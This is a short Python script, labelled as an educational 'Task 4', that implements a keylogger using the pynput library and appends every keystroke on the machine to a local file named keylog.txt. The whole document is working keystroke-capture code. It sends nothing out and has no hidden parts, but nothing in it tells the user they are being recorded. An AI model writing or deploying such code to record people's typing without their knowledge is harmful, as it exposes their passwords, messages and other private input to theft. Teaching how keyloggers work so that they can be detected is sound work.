# Task 4: Simple Keylogger for Educational Purposes
from pynput.keyboard import Key, Listener

# The file where the keys will be saved
log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        # Clean the key name and write to file
        k = str(key).replace("'", "")
        if k == "Key.space":
            f.write(" ")
        elif k == "Key.enter":
            f.write("\n")
        else:
            f.write(k)

# This "listens" to the keyboard hardware
with Listener(on_press=on_press) as listener:
    listener.join()